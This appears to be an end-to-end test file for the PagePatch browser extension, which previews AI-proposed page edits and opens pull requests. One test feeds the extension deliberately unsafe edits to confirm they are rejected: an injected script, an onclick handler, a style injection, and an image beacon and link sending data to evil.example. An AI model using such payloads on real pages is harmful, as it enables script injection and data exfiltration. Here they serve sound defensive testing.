// End-to-end: loads the real extension in Chromium against the React and
// static fixtures, with a scripted mock of the PagePatch API. The mock
// deliberately skips server-side validation so the extension's own
// validation is what's under test.
//
// Run: pnpm --filter @pagepatch/fixture-react build && pnpm --filter @pagepatch/extension test
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { execFileSync } from "node:child_process";
import { extname, join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const here = dirname(fileURLToPath(import.meta.url));
const repo = join(here, "..", "..");
const ext = join(here, "..", "dist");

let fixtures, api, ctx, panel, page, extId, fixtureUrl;
const calls = [];          // requests the mock API received
let prAttempts = 0;

const json = (res, status, body) => { res.writeHead(status, { "content-type": "application/json", "access-control-allow-origin": "*", "access-control-allow-headers": "*" }); res.end(JSON.stringify(body)); };
const readBody = (req) => new Promise((r) => { let b = ""; req.on("data", (c) => (b += c)); req.on("end", () => r(b ? JSON.parse(b) : {})); });

function previewFor(text) {
  const t = text.toLowerCase();
  if (t.includes("two columns")) return { summary: "Two-column grid.", ops: [{ op: "setStyle", target: "pp0", styles: { display: "grid", "grid-template-columns": "1fr 1fr" } }] };
  if (t.includes("add a card")) return { summary: "Added a card.", ops: [{ op: "insert", parent: "pp0", index: 3, node: { tag: "article", attrs: { class: "feature-card" }, children: [{ tag: "h3", text: "Offline mode" }] } }] };
  if (t.includes("remove the first")) return { summary: "Removed the first card.", ops: [{ op: "remove", target: "pp1" }] };
  if (t.includes("move offline")) return { summary: "Moved Offline first.", ops: [{ op: "move", target: "pp10", index: 0 }] };
  if (t.includes("rename")) return { summary: "New heading.", ops: [{ op: "setText", target: "pp1", text: "Clear, honest pricing" }] };
  if (t.includes("evil")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "script", text: "window.__pwned = 1" } }] };
  if (t.includes("handler")) return { summary: "x", ops: [{ op: "setAttr", target: "pp1", name: "onclick", value: "window.__pwned = 1" }] };
  if (t.includes("outside")) return { summary: "x", ops: [{ op: "setText", target: "pp999", text: "escaped" }] };
  if (t.includes("style attack")) return { summary: "x", ops: [{ op: "setText", target: "pp10", text: "body{display:none}" }] };
  if (t.includes("image beacon")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "img", attrs: { src: "https://evil.example/x.png?d=secret", alt: "" } } }] };
  if (t.includes("href on heading")) return { summary: "x", ops: [{ op: "setAttr", target: "pp2", name: "href", value: "https://evil.example" }] };
  if (t.includes("position")) return { summary: "x", ops: [{ op: "setStyle", target: "pp0", styles: { position: "fixed", inset: "0" } }] };
  return { summary: "Nothing to change.", ops: [] };
}

before(async () => {
  execFileSync("node", [join(here, "build.mjs")], { env: { ...process.env, PAGEPATCH_TEST: "1", PAGEPATCH_API: "http://127.0.0.1:8799", GH_CLIENT_ID: "test" } });

  fixtures = createServer(async (req, res) => {
    const url = new URL(req.url, "http://x");
    const [, site, ...rest] = url.pathname.split("/");
    const base = site === "react" ? join(repo, "fixtures/react/dist") : join(repo, "fixtures/static");
    const file = join(base, rest.join("/") || "index.html");
    try {
      const body = await readFile(file);
      res.writeHead(200, { "content-type": { ".html": "text/html", ".css": "text/css", ".js": "text/javascript" }[extname(file)] ?? "text/plain" });
      res.end(body);
    } catch { res.writeHead(404); res.end(); }
  }).listen(8798, "127.0.0.1");
  fixtureUrl = "http://127.0.0.1:8798";

  api = createServer(async (req, res) => {
    if (req.method === "OPTIONS") return json(res, 204, {});
    const url = new URL(req.url, "http://x");
    const body = req.method === "POST" ? await readBody(req) : {};
    calls.push({ path: url.pathname, body, key: req.headers["x-provider-key"], auth: req.headers.authorization });
    if (url.pathname === "/v1/preview") return json(res, 200, previewFor(body.messages.at(-1).content));
    if (url.pathname === "/v1/repos") return json(res, 200, { repos: [{ owner: "acme", name: "lumen", defaultBranch: "main" }] });
    if (url.pathname.endsWith("/branches")) return json(res, 200, { branches: ["main", "dev"] });
    if (url.pathname === "/v1/source/propose") {
      if (!body.paths) return json(res, 200, { status: "choose", candidates: [{ path: "src/components/Pricing.tsx", reasons: ["class .pricing"] }, { path: "src/App.tsx", reasons: [] }] });
      return json(res, 200, { status: "ready", proposalId: `00000000-0000-0000-0000-00000000000${prAttempts}`, summary: "Retitle pricing.", files: body.paths,
        diff: `--- a/${body.paths[0]}\n+++ b/${body.paths[0]}\n@@ -1 +1 @@\n-<h2>Simple pricing</h2>\n+<h2>Clear, honest pricing</h2>\n` });
    }
    if (url.pathname === "/v1/source/pr") {
      prAttempts++;
      if (prAttempts === 1) return json(res, 409, { error: "base_advanced", message: "main has new commits. Regenerate the patch and review it again." });
      return json(res, 200, { url: "https://github.com/acme/lumen/pull/7" });
    }
    json(res, 404, { error: "not_found" });
  }).listen(8799, "127.0.0.1");

  ctx = await chromium.launchPersistentContext("", {
    channel: "chromium",
    headless: true,
    args: [`--disable-extensions-except=${ext}`, `--load-extension=${ext}`],
  });
  let [sw] = ctx.serviceWorkers();
  sw ??= await ctx.waitForEvent("serviceworker");
  extId = new URL(sw.url()).host;

  page = await ctx.newPage();
  await page.goto(`${fixtureUrl}/static/`);
  panel = await ctx.newPage();
  await panel.goto(`chrome-extension://${extId}/sidepanel.html`);
  // Simulate a signed-in GitHub session (OAuth can't run headless).
  await panel.evaluate(() => chrome.storage.session.set({ ghToken: "gh-test", ghLogin: "octo" }));
  await panel.reload();
});

after(async () => {
  await ctx?.close();
  fixtures?.close();
  api?.close();
});

// Equivalent of the toolbar click: inject into the fixture tab and point the panel at it.
async function activate(urlPrefix) {
  const sw = ctx.serviceWorkers()[0];
  await sw.evaluate(async (prefix) => {
    const [tab] = await chrome.tabs.query({ url: `${prefix}*` });
    await chrome.scripting.executeScript({ target: { tabId: tab.id }, files: ["content.js"] });
    await chrome.storage.session.set({ target: { tabId: tab.id, supported: true, at: Date.now() } });
  }, urlPrefix);
  await panel.getByText("Click a section on the page").waitFor();
}

async function pickAt(selector, dx = 4, dy = 4) {
  await page.bringToFront();
  const box = await page.locator(selector).first().boundingBox();
  await page.mouse.move(box.x + dx, box.y + dy);
  await page.mouse.click(box.x + dx, box.y + dy);
}

async function send(text, expectStatus) {
  await panel.locator("#prompt").fill(text);
  await panel.locator("#send").click();
  await panel.locator("#status").filter({ hasText: expectStatus }).waitFor();
}

const status = () => panel.locator("#status").textContent();
const cards = () => page.$$eval(".features:not([style*='none']) h3", (els) => els.map((e) => e.textContent));

test("select, preview, follow up, undo, reset (static fixture)", async () => {
  await activate(`${fixtureUrl}/static/`);
  await page.evaluate(() => { window.__orig = document.querySelector(".features"); });
  await pickAt(".features");
  await panel.locator("#selection-label").filter({ hasText: "section.features" }).waitFor();

  // Settings: key + default model
  await panel.locator("#key").fill("sk-test-123");
  await panel.locator("#save-settings").click();

  // First send shows the disclosure
  await panel.locator("#prompt").fill("make it two columns");
  await panel.locator("#send").click();
  await panel.locator("#disclosure").waitFor({ state: "visible" });
  await panel.locator("#accept-disclosure").click();
  await panel.locator("#status").filter({ hasText: "Review the proposal" }).waitFor();
  assert.equal(calls.at(-1).key, "sk-test-123");
  assert.equal(calls.at(-1).body.model, "claude-opus-5-5");

  await panel.locator("#apply").click();
  await panel.locator("#status").filter({ hasText: "Preview applied" }).waitFor();
  const cols = await page.$eval(".features[data-pp-id]", (el) => getComputedStyle(el).gridTemplateColumns.split(" ").length);
  assert.equal(cols, 2);

  await send("add a card", "Review the proposal");
  await panel.locator("#apply").click();
  await panel.locator("#status").filter({ hasText: "Preview applied" }).waitFor();
  assert.deepEqual(await cards(), ["Fast capture", "Linked decisions", "Instant search", "Offline mode"]);
  // Follow-up requests see the current preview, including the new node
  assert.match(calls.at(-1).body.snapshot, /Offline mode|data-pp-id="pp0"/);

  await send("remove the first card", "Review the proposal");
  await panel.locator("#apply").click();
  await panel.locator("#status").filter({ hasText: "Preview applied" }).waitFor();
  assert.deepEqual(await cards(), ["Linked decisions", "Instant search", "Offline mode"]);

  await send("move offline first", "Review the proposal");
  await panel.locator("#apply").click();
  await panel.locator("#status").filter({ hasText: "Preview applied" }).waitFor();
  assert.deepEqual(await cards(), ["Offline mode", "Linked decisions", "Instant search"]);

  await panel.locator("#undo").click();
  await panel.locator("#status").filter({ hasText: "Undid" }).waitFor();
  assert.deepEqual(await cards(), ["Linked decisions", "Instant search", "Offline mode"]);

  await panel.locator("#reset").click();
  await panel.locator("#status").filter({ hasText: "Reset" }).waitFor();
  assert.deepEqual(await cards(), ["Fast capture", "Linked decisions", "Instant search"]);
  assert.equal(await page.evaluate(() => document.querySelector(".features") === window.__orig && !window.__orig.hasAttribute("style")), true);
  assert.equal(await page.$$eval("[data-pp-id]", (els) => els.length), 0, "no preview nodes left behind");
});

test("unsafe model output never touches the page", async () => {
  for (const text of ["evil", "handler", "outside", "position", "style attack", "image beacon", "href on heading"]) {
    await send(text, "Review the proposal");
    const before = await page.$eval("main", (m) => m.innerHTML);
    await panel.locator("#apply").click();
    await panel.locator("#status").filter({ hasText: "Rejected unsafe change" }).waitFor();
    assert.equal(await page.$eval("main", (m) => m.innerHTML), before, `${text}: page changed`);
  }
  assert.equal(await page.evaluate(() => window.__pwned), undefined);
  assert.equal(await page.$$eval("main script", (s) => s.length), 0);
  assert.equal(await page.$eval("body", (b) => getComputedStyle(b).display), "block");
});

test("a proposal made for an earlier state is not applied", async () => {
  await send("make it two columns", "Review the proposal");
  // The page state changes (here: Reset) after the proposal was made.
  await panel.evaluate(() => document.getElementById("reset").removeAttribute("disabled"));
  await panel.locator("#reset").click();
  await panel.locator("#status").filter({ hasText: "Reset" }).waitFor();
  // Reset clears the pending proposal in the panel; force the stale apply through the content script directly.
  const r = await panel.evaluate(async () => {
    const { target } = await chrome.storage.session.get("target");
    return chrome.tabs.sendMessage(target.tabId, { type: "apply", version: -5, ops: [{ op: "setText", target: "pp2", text: "stale" }] });
  });
  assert.equal(r.ok, false);
  assert.match(r.error, /earlier state/);
});

test("snapshots omit form values, hidden inputs, and URL query strings", async () => {
  await panel.locator("#reselect").click();
  await pickAt(".signup");
  await panel.locator("#selection-label").filter({ hasText: "section.signup" }).waitFor();
  await send("tighten this", "No change proposed");
  const snap = calls.at(-1).body.snapshot;
  assert.doesNotMatch(snap, /private@example\.com|confidential draft|hidden-csrf-token/);
  assert.match(snap, /<input [^>]*type="email"/);

  await panel.locator("#reselect").click();
  await pickAt(".hero");
  await panel.locator("#selection-label").filter({ hasText: "section#hero.hero" }).waitFor();
  await send("tighten this", "No change proposed");
  const heroSnap = calls.at(-1).body.snapshot;
  assert.match(heroSnap, /href="\/signup"/);
  assert.doesNotMatch(heroSnap, /secret123|plan=pro|utm_source/);
});

test("navigation clears the session", async () => {
  await page.goto(`${fixtureUrl}/react/`);
  await panel.locator("#status").filter({ hasText: "The page changed" }).waitFor();
  assert.equal(await panel.locator("#conversation li").count(), 0);
});

test("React fixture: preview, stale selection, source diff and draft PR", async () => {
  await activate(`${fixtureUrl}/react/`);
  await pickAt(".pricing");
  await panel.locator("#selection-label").filter({ hasText: "section.pricing" }).waitFor();
  await send("rename the heading", "Review the proposal");
  await panel.locator("#apply").click();
  await panel.locator("#status").filter({ hasText: "Preview applied" }).waitFor();
  assert.equal(await page.locator(".pricing-title:visible").textContent(), "Clear, honest pricing");

  // Source: ambiguous match -> choose file -> diff
  await panel.locator("#generate").waitFor({ state: "visible" });
  await panel.locator("#generate").click();
  await panel.locator("#candidates").waitFor({ state: "visible" });
  await panel.getByRole("button", { name: "src/components/Pricing.tsx" }).click();
  await panel.locator("#diff-view").waitFor({ state: "visible" });
  assert.match(await panel.locator("#diff").textContent(), /\+<h2>Clear, honest pricing<\/h2>/);
  const propose = calls.filter((c) => c.path === "/v1/source/propose").at(-1);
  assert.equal(propose.auth, "Bearer gh-test");
  assert.deepEqual(propose.body.paths, ["src/components/Pricing.tsx"]);
  assert.equal(propose.body.ops[0].op, "setText");

  // Base advanced -> automatic regeneration -> review again -> PR
  await panel.locator("#create-pr").click();
  await panel.locator("#status").filter({ hasText: "made a new diff" }).waitFor();
  assert.equal(calls.filter((c) => c.path === "/v1/source/propose").length, 3);
  await panel.locator("#create-pr").click();
  await panel.locator("#pr-result a").waitFor();
  assert.equal(await panel.locator("#pr-result a").getAttribute("href"), "https://github.com/acme/lumen/pull/7");

  // A framework re-render replaces the selected node -> prompt to reselect, and React keeps working
  await page.bringToFront();
  await page.locator("button.rerender").click();
  await panel.locator("#status").filter({ hasText: "replaced the selected section" }).waitFor();
  assert.equal(await page.locator(".pricing").count(), 1, "preview clone removed, React's new node remains");
  assert.equal(await page.locator(".pricing-title").textContent(), "Simple pricing");
  assert.equal(await panel.locator("#selection-label").textContent(), "Selection lost");
});
